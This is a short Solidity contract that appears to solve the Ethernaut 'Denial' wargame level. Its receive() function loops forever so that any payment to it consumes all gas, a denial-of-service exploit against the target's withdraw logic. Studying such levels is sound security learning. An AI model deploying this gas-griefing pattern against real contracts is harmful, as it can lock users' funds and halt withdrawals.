pragma solidity ^0.8.0;

import 'levels/Denial.sol';

contract DenialHack {
  receive() external payable {
    while (true) { }
  }
}
